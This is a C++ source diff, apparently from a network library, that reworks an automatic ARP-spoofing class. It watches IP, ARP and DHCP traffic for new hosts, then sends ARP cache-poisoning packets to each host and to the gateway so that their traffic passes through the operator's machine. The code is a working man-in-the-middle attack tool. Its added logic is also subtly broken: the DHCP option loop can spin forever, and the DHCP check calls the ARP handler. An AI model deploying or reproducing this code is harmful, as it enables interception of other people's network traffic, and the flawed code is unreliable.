@@ -1,38 +1,123 @@
 #include "gautoarpspoof.h"
+#include "net/pdu/gdhcphdr.h"
 
 // ----------------------------------------------------------------------------
 // GAutoArpSpoof
 // ----------------------------------------------------------------------------
-void GAutoArpSpoof::processArp(GPacket* packet) {
-	Q_ASSERT(packet->arpHdr_ != nullptr);
-	GArpHdr* arpHdr = packet->arpHdr_;
+bool GAutoArpSpoof::doOpen() {
+	if (!enabled_) return true;
 
-	GIp sip = arpHdr->sip();
-	GIp gwip = intf_->gateway();
-	if (sip == intf_->ip() || sip == gwip)
-		return;
+	if (checkIp_ == false && checkArp_ == false && checkDhcp_ == false) {
+		SET_ERR(GErr::FAIL, "all checking ip, arp, dhcp are false");
+		return false;
+	}
 
-	GFlow::IpFlowKey ipFlowKey(sip, gwip);
-	if (flowMap_.find(ipFlowKey) != flowMap_.end()) return;
+	if (!GArpSpoof::doOpen()) return false;
 
-	GAtm::iterator it = atm_.find(gwip);
+
+	Q_ASSERT(intf_ != nullptr);
+	myMac_ = intf_->mac();
+	myIp_ = intf_->ip();
+	gwIp_ = intf_->gateway();
+
+	GAtm::iterator it = atm_.find(gwIp_);
 	if (it == atm_.end()) {
-		atm_.insert(gwip, GMac::nullMac());
+		atm_.insert(gwIp_, GMac::nullMac());
 		if (!atm_.open()) {
 			err = atm_.err;
-			return;
+			return false;
 		}
 		bool res = atm_.wait();
 		if (!res) {
-			qWarning() << QString("can not find mac for %s").arg(QString(gwip));
-			return;
+			qWarning() << QString("can not find mac for %s").arg(QString(gwIp_));
+			return false;
 		}
-		it = atm_.find(gwip);
+		it = atm_.find(gwIp_);
 		Q_ASSERT(it != atm_.end());
 	}
-	GMac gwmac = it.value();
+	gwMac_ = it.value();
 
-	Flow flow(sip, arpHdr->smac(), gwip, gwmac);
+	return true;
+}
+
+bool GAutoArpSpoof::doClose() {
+	if (!enabled_) return true;
+
+	return GArpSpoof::doClose();
+}
+
+bool GAutoArpSpoof::processIp(GPacket* packet, GMac* mac, GIp* ip) {
+	GEthHdr* ethHdr = packet->ethHdr_;
+	if (ethHdr == nullptr) return false;
+
+	GIpHdr* ipHdr = packet->ipHdr_;
+	if (ipHdr == nullptr) return false;
+
+	*mac = ethHdr->smac();
+	*ip = ipHdr->sip();
+	return true;
+}
+
+bool GAutoArpSpoof::processArp(GPacket* packet, GMac* mac, GIp* ip) {
+	GArpHdr* arpHdr = packet->arpHdr_;
+	if (arpHdr == nullptr) return false;
+
+	*mac = arpHdr->smac();
+	*ip = arpHdr->sip();
+	return true;
+}
+
+bool GAutoArpSpoof::processDhcp(GPacket* packet, GMac* mac, GIp* ip) {
+	GUdpHdr* udpHdr = packet->udpHdr_;
+	if (udpHdr == nullptr) return false;
+
+	if (!(udpHdr->sport() == 67 || udpHdr->dport() == 67)) return false;
+
+	GBuf dhcp = packet->udpData_;
+	if (dhcp.data_ == nullptr) return false;
+	if (dhcp.size_ < sizeof(GDhcpHdr)) return false;
+	GDhcpHdr* dhcpHdr = PDhcpHdr(dhcp.data_);
+
+	if (dhcpHdr->yourIp() != 0) { // DHCP Offer of DHCP ACK sent from server
+		*mac = dhcpHdr->clientMac();
+		*ip = dhcpHdr->yourIp();
+		return true;
+	}
+
+	GEthHdr* ethHdr = packet->ethHdr_;
+	if (ethHdr == nullptr) return false;
+	GDhcpHdr::Option* option = dhcpHdr->first();
+	while (true) {
+		if (option->type_ == GDhcpHdr::RequestedIpAddress) {
+			GDhcpHdr::POptionRequestIpAddress ipAddress = GDhcpHdr::POptionRequestIpAddress(option);
+			*mac = ethHdr->smac();
+			*ip = ntohl(ipAddress->ip_);
+			return true;
+			option = option->next();
+			if (option == nullptr) break;
+		}
+	}
+
+	return false;
+}
+
+void GAutoArpSpoof::processPacket(GPacket* packet) {
+	GMac mac;
+	GIp ip;
+
+	bool attack = false;
+	if (checkIp_ && processIp(packet, &mac, &ip)) attack = true;
+	if (checkArp_ && processArp(packet, &mac, &ip)) attack = true;
+	if (checkDhcp_ && processArp(packet, &mac, &ip)) attack = true;
+	if (!attack) return;
+
+	if (ip == myIp_ || ip == gwIp_) return;
+	if (mac == myMac_ || mac == gwMac_) return;
+
+	GFlow::IpFlowKey ipFlowKey(ip, gwIp_);
+	if (flowMap_.find(ipFlowKey) != flowMap_.end()) return;
+
+	Flow flow(ip, mac, gwIp_, gwMac_);
 	flow.makePacket(&flow.infectPacket_, myMac_, true);
 	flow.makePacket(&flow.recoverPacket_, myMac_, false);
 
@@ -40,8 +125,8 @@ void GAutoArpSpoof::processArp(GPacket* packet) {
 	flowList_.push_back(flow);
 	sendArpInfect(&flow);
 
-	GFlow::IpFlowKey revIpFlowKey(gwip, sip);
-	Flow revFlow(gwip, gwmac, sip, arpHdr->smac());
+	GFlow::IpFlowKey revIpFlowKey(gwIp_, ip);
+	Flow revFlow(gwIp_, gwMac_, ip, mac);
 	revFlow.makePacket(&revFlow.infectPacket_, myMac_, true);
 	revFlow.makePacket(&revFlow.recoverPacket_, myMac_, false);
 
@@ -52,5 +137,5 @@ void GAutoArpSpoof::processArp(GPacket* packet) {
 	}
 	sendArpInfect(&revFlow);
 
-	qDebug() << QString("new ip(%1) is detected").arg(QString(sip));
+	qDebug() << QString("new host(%1 %2) is detected").arg(QString(mac), QString(ip));
 }
